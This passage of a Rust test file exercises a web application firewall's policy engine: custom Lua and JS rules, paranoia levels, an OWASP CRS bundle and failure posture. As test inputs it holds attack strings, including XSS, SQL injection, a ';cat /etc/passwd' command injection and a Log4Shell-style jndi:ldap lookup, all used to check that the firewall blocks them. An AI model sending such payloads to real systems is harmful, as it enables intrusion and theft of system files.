        let headers = make_header_map(&[]);
        let result = policy.check_request("/submit", &headers, Some("<script>alert(1)</script>"));
        assert!(matches!(result, WafResult::Blocked(_)));
    }

    #[test]
    fn waf_js_rule_body_check_allows_clean() {
        let policy = WafPolicy::from_config(serde_json::json!({
            "custom_rules": [
                {
                    "id": "js-body-check",
                    "js_script": r#"
                        function match(request) {
                            const body = request.body || "";
                            return body.includes("<script>");
                        }
                    "#,
                    "message": "XSS blocked by JS rule"
                }
            ]
        }))
        .unwrap();

        let headers = make_header_map(&[]);
        let result = policy.check_request("/submit", &headers, Some("clean input data"));
        assert!(matches!(result, WafResult::Clean));
    }

    #[test]
    fn waf_lua_and_js_rules_can_coexist() {
        // A WAF policy with one Lua rule and one JS rule
        let policy = WafPolicy::from_config(serde_json::json!({
            "custom_rules": [
                {
                    "id": "lua-check",
                    "lua_script": r#"
                        function match(request)
                            local ua = request:header("user-agent") or ""
                            return ua:find("evilbot") ~= nil
                        end
                    "#,
                    "message": "lua: blocked"
                },
                {
                    "id": "js-check",
                    "js_script": r#"
                        function match(request) {
                            return request.uri.includes("/admin");
                        }
                    "#,
                    "message": "js: blocked admin"
                }
            ]
        }))
        .unwrap();

        // JS rule blocks /admin
        let headers = make_header_map(&[("user-agent", "Mozilla/5.0")]);
        let result = policy.check_request("/admin/panel", &headers, None);
        assert!(matches!(result, WafResult::Blocked(_)));

        // Neither rule matches for clean request
        let result = policy.check_request("/api/users", &headers, None);
        assert!(matches!(result, WafResult::Clean));
    }

    // --- Paranoia level tests ---

    /// Default paranoia is 1 when no field is set on the policy.
    #[test]
    fn waf_default_paranoia_is_one() {
        let policy = WafPolicy::from_config(serde_json::json!({})).unwrap();
        assert_eq!(policy.effective_paranoia(), 1);
    }

    /// Top-level `paranoia` overrides the nested CRS field for back-compat.
    #[test]
    fn waf_top_level_paranoia_wins_over_owasp_crs() {
        let policy = WafPolicy::from_config(serde_json::json!({
            "paranoia": 3,
            "owasp_crs": { "enabled": true, "paranoia_level": 1 },
        }))
        .unwrap();
        assert_eq!(policy.effective_paranoia(), 3);
    }

    /// `owasp_crs.paranoia_level` is honored when the top-level field is unset.
    #[test]
    fn waf_owasp_crs_paranoia_level_used_as_fallback() {
        let policy = WafPolicy::from_config(serde_json::json!({
            "owasp_crs": { "enabled": true, "paranoia_level": 2 },
        }))
        .unwrap();
        assert_eq!(policy.effective_paranoia(), 2);
    }

    /// Out-of-range values clamp into the 1-4 window.
    #[test]
    fn waf_paranoia_clamps_to_valid_range() {
        let high = WafPolicy::from_config(serde_json::json!({ "paranoia": 99 })).unwrap();
        assert_eq!(high.effective_paranoia(), 4);
        let low = WafPolicy::from_config(serde_json::json!({ "paranoia": 0 })).unwrap();
        assert_eq!(low.effective_paranoia(), 1);
    }

    /// Built-in stricter SQLi pattern (paranoia=2) does not fire at paranoia=1.
    #[test]
    fn waf_strict_sqli_pattern_skipped_at_paranoia_one() {
        let policy = WafPolicy::from_config(serde_json::json!({
            "owasp_crs": { "enabled": true },
            "paranoia": 1,
            "action_on_match": "block",
        }))
        .unwrap();

        // Payload only matches SQLI_STRICT_PATTERN (paranoia=2), not the
        // baseline SQLI_PATTERN, XSS_PATTERN, or PATH_TRAVERSAL_PATTERN.
        let headers = make_header_map(&[]);
        let result = policy.check_request("/api?q=BENCHMARK(1000000,sha1(1))", &headers, None);
        assert!(
            matches!(result, WafResult::Clean),
            "paranoia=1 must skip strict-only signatures, got {:?}",
            std::mem::discriminant(&result)
        );
    }

    /// Same payload triggers when paranoia is raised to 2.
    #[test]
    fn waf_strict_sqli_pattern_fires_at_paranoia_two() {
        let policy = WafPolicy::from_config(serde_json::json!({
            "owasp_crs": { "enabled": true },
            "paranoia": 2,
            "action_on_match": "block",
        }))
        .unwrap();

        let headers = make_header_map(&[]);
        let result = policy.check_request("/api?q=BENCHMARK(1000000,sha1(1))", &headers, None);
        assert!(
            matches!(result, WafResult::Blocked(_)),
            "paranoia=2 must run strict signatures"
        );
    }

    /// Custom rules without a paranoia attribute always run (default=1).
    #[test]
    fn waf_custom_rule_default_paranoia_always_runs() {
        let policy = WafPolicy::from_config(serde_json::json!({
            "paranoia": 1,
            "custom_rules": [
                {
                    "id": "default-paranoia",
                    "operator": "contains",
                    "pattern": "/forbidden",
                    "action": "block",
                    "message": "default paranoia rule"
                }
            ]
        }))
        .unwrap();

        let headers = make_header_map(&[]);
        let result = policy.check_request("/forbidden/path", &headers, None);
        assert!(matches!(result, WafResult::Blocked(_)));
    }

    /// Custom rule tagged paranoia=3 is suppressed when policy paranoia=1.
    #[test]
    fn waf_high_paranoia_custom_rule_skipped_at_low_policy_paranoia() {
        let policy = WafPolicy::from_config(serde_json::json!({
            "paranoia": 1,
            "custom_rules": [
                {
                    "id": "noisy-rule",
                    "paranoia": 3,
                    "operator": "contains",
                    "pattern": "edge-case",
                    "action": "block",
                    "message": "edge case"
                }
            ]
        }))
        .unwrap();

        let headers = make_header_map(&[]);
        let result = policy.check_request("/api?x=edge-case", &headers, None);
        assert!(
            matches!(result, WafResult::Clean),
            "paranoia=3 rule must not run at policy paranoia=1"
        );
    }

    // --- Shipped OWASP CRS managed bundle ---

    /// The managed bundle enables with one flag and blocks a known
    /// CRS-flagged payload (here, an RCE command-injection signature
    /// from the paranoia=1 baseline rules).
    #[test]
    fn waf_managed_bundle_blocks_known_payload_with_one_flag() {
        let policy = WafPolicy::from_config(serde_json::json!({
            "owasp_crs": { "managed_bundle": true },
            "action_on_match": "block",
        }))
        .unwrap();

        let headers = make_header_map(&[]);
        // `; cat /etc/passwd` matches the crs-932-100 RCE signature, which
        // is paranoia=1 (always-on once the bundle is enabled).
        let result = policy.check_request("/run?cmd=;cat%20/etc/passwd", &headers, None);
        assert!(
            matches!(result, WafResult::Blocked(_)),
            "managed bundle must block a known CRS payload"
        );
    }

    /// The managed bundle is off unless the flag is set, even when the
    /// built-in `owasp_crs.enabled` toggle is present.
    #[test]
    fn waf_managed_bundle_disabled_by_default() {
        let policy = WafPolicy::from_config(serde_json::json!({
            "owasp_crs": { "enabled": false },
            "action_on_match": "block",
        }))
        .unwrap();

        let headers = make_header_map(&[]);
        // crs-934-100 (node injection, paranoia=2) signature; without the
        // managed_bundle flag nothing in the bundle runs.
        let result = policy.check_request("/api?x=require('child_process')", &headers, None);
        assert!(
            matches!(result, WafResult::Clean),
            "managed bundle rules must not run unless managed_bundle: true"
        );
    }

    /// The selectable paranoia level gates the bundle's stricter rules:
    /// a paranoia>=2 bundle rule does not fire at paranoia=1 but does at 2.
    #[test]
    fn waf_managed_bundle_respects_paranoia_level() {
        // crs-944-100 (Java/Log4Shell-style jndi lookup) is paranoia=2.
        let payload = "/lookup?q=%24%7Bjndi%3Aldap%3A%2F%2Fevil%7D";

        let low = WafPolicy::from_config(serde_json::json!({
            "owasp_crs": { "managed_bundle": true, "paranoia_level": 1 },
            "action_on_match": "block",
        }))
        .unwrap();
        let headers = make_header_map(&[]);
        assert!(
            matches!(low.check_request(payload, &headers, None), WafResult::Clean),
            "paranoia=1 must skip the strict bundle rule"
        );

        let high = WafPolicy::from_config(serde_json::json!({
            "owasp_crs": { "managed_bundle": true, "paranoia_level": 2 },
            "action_on_match": "block",
        }))
        .unwrap();
        assert!(
            matches!(
                high.check_request(payload, &headers, None),
                WafResult::Blocked(_)
            ),
            "paranoia=2 must run the strict bundle rule"
        );
    }

    // --- Persistent-block plumbing ---

    /// A WAF policy with `persistent_block.enabled: true` builds a live
    /// block-store; without the block the accessor returns `None`.
    #[test]
    fn waf_persistent_block_store_built_when_enabled() {
        let off = WafPolicy::from_config(serde_json::json!({})).unwrap();
        assert!(off.block_store().is_none());

        let on = WafPolicy::from_config(serde_json::json!({
            "persistent_block": {
                "enabled": true,
                "strikes": 3,
                "block_minutes": 5,
                "track_by": "ip",
            }
        }))
        .unwrap();
        assert!(on.block_store().is_some());
        assert_eq!(
            on.block_store().unwrap().key_kind(),
            crate::policy::waf::BlockKeyKind::Ip
        );
    }

    // --- Failure posture ---

    /// The legacy boolean still parses and still decides the posture
    /// when the new key is absent. Both polarities, plus the omitted
    /// case, so an existing config is pinned in all three shapes.
    #[test]
    fn waf_legacy_fail_open_still_decides_the_posture() {
        let omitted = WafPolicy::from_config(serde_json::json!({})).unwrap();
        assert_eq!(omitted.failure_posture(), FailureMode::Closed);

        let explicit_false =
            WafPolicy::from_config(serde_json::json!({ "fail_open": false })).unwrap();
        assert_eq!(explicit_false.failure_posture(), FailureMode::Closed);

        let explicit_true =
            WafPolicy::from_config(serde_json::json!({ "fail_open": true })).unwrap();
        assert_eq!(explicit_true.failure_posture(), FailureMode::Open);
    }

    /// The explicit key wins over the legacy boolean in both
    /// directions. Asserting only the agreeing case would not tell a
    /// precedence bug apart from a working accessor.
    #[test]
    fn waf_failure_posture_overrides_legacy_fail_open() {
        let closed_over_open = WafPolicy::from_config(serde_json::json!({
            "fail_open": true,
            "failure_posture": "closed",
        }))
        .unwrap();
        assert_eq!(closed_over_open.failure_posture(), FailureMode::Closed);

        let open_over_closed = WafPolicy::from_config(serde_json::json!({
            "fail_open": false,
            "failure_posture": "open",
        }))
        .unwrap();
        assert_eq!(open_over_closed.failure_posture(), FailureMode::Open);
    }

    /// `degraded` parses and resolves; it is the supported way to admit
    /// an uninspected request while marking the guarantee as not made.
    #[test]
    fn waf_failure_posture_accepts_degraded() {
        let policy =
            WafPolicy::from_config(serde_json::json!({ "failure_posture": "degraded" })).unwrap();
        assert_eq!(policy.failure_posture(), FailureMode::Degraded);
        assert!(policy.failure_posture().admits());
        assert!(policy.failure_posture().guarantee_waived());
    }

    /// `observe` has no counterfactual to record at a site that exists
    /// because no decision was reached, so config compile refuses it
    /// rather than silently treating it as `open`. The error names the
    /// site.
    #[test]
    fn waf_failure_posture_rejects_observe_at_config_compile() {
        let err = WafPolicy::from_config(serde_json::json!({ "failure_posture": "observe" }))
            .expect_err("observe must not compile at the waf site");
        let msg = err.to_string();
        assert!(
            msg.contains("waf policy"),
            "error must name the site: {msg}"
        );
        assert!(
            msg.contains("degraded"),
            "error must point at the posture that does work here: {msg}"
        );
    }

    /// A custom rule the engine cannot evaluate leaves the request
    /// uninspected. Reporting `Clean` there would tell the caller the
    /// WAF looked and found nothing, which is not what happened.
    #[test]
    fn waf_unevaluatable_custom_rule_reports_error_not_clean() {
        let policy = WafPolicy::from_config(serde_json::json!({
            "custom_rules": [
                {
                    "id": "broken-regex",
                    "operator": "rx",
                    "pattern": "(unclosed",
                    "message": "never evaluated"
                }
            ]
        }))
        .unwrap();

        let headers = make_header_map(&[]);
        match policy.check_request("/api", &headers, None) {
            WafResult::Error(msg) => {
                assert!(msg.contains("broken-regex"), "must name the rule: {msg}");
            }
            _ => panic!("an unevaluatable rule must not report Clean"),
        }
    }

    /// An unknown operator is the other engine-error shape and lands on
    /// the same verdict.
    #[test]
    fn waf_unknown_operator_reports_error() {
        let policy = WafPolicy::from_config(serde_json::json!({
            "custom_rules": [
                { "id": "bad-op", "operator": "sorcery", "pattern": "x" }
            ]
        }))
        .unwrap();

        let headers = make_header_map(&[]);
        assert!(matches!(
            policy.check_request("/api", &headers, None),
            WafResult::Error(_)
        ));
    }

    /// WOR-1152 regression pin. A malformed rule must not abort the
    /// pass: the rules after it still run, and a block from one of them
    /// still wins over the failure posture. Ordering matters here, so
    /// the broken rule is deliberately first.
    #[test]
    fn waf_a_later_rule_still_blocks_after_an_unevaluatable_one() {
        let policy = WafPolicy::from_config(serde_json::json!({
            "custom_rules": [
                { "id": "broken-regex", "operator": "rx", "pattern": "(unclosed" },
                {
                    "id": "still-enforcing",
                    "operator": "contains",
                    "pattern": "/forbidden",
                    "action": "block",
                    "message": "later rule still ran"
                }
            ]
        }))
        .unwrap();

        let headers = make_header_map(&[]);
        match policy.check_request("/forbidden/path", &headers, None) {
            WafResult::Blocked(msg) => {
                assert!(msg.contains("still-enforcing"), "{msg}");
            }
            _ => panic!("a malformed rule must not stop the remaining rules from enforcing"),
        }
    }

    /// A policy with no custom rules cannot produce an engine error, so
    /// the posture never engages and a clean request stays clean under
    /// either legacy setting. This is the shape almost every shipped
    /// WAF config has, and it is unchanged.
    #[test]
    fn waf_without_custom_rules_is_unaffected_by_the_posture() {
        for fail_open in [false, true] {
            let policy = WafPolicy::from_config(serde_json::json!({
                "owasp_crs": { "enabled": true },
                "action_on_match": "block",
                "fail_open": fail_open,
            }))
            .unwrap();
            let headers = make_header_map(&[]);
            assert!(
                matches!(
                    policy.check_request("/api?q=hello", &headers, None),
                    WafResult::Clean
                ),
                "fail_open={fail_open} must not change a clean request"
            );
            assert!(
                matches!(
                    policy.check_request("/api?q=union%20select%20*", &headers, None),
                    WafResult::Blocked(_)
                ),
                "fail_open={fail_open} must not change a blocked request"
            );
        }
    }

    /// Same custom rule fires once policy paranoia is raised.
    #[test]
    fn waf_high_paranoia_custom_rule_fires_at_matching_policy_paranoia() {
        let policy = WafPolicy::from_config(serde_json::json!({
            "paranoia": 3,
            "custom_rules": [
                {
                    "id": "noisy-rule",
                    "paranoia": 3,
                    "operator": "contains",
                    "pattern": "edge-case",
                    "action": "block",
                    "message": "edge case"
                }
            ]
        }))
        .unwrap();

        let headers = make_header_map(&[]);
        let result = policy.check_request("/api?x=edge-case", &headers, None);
        assert!(matches!(result, WafResult::Blocked(_)));
    }
}
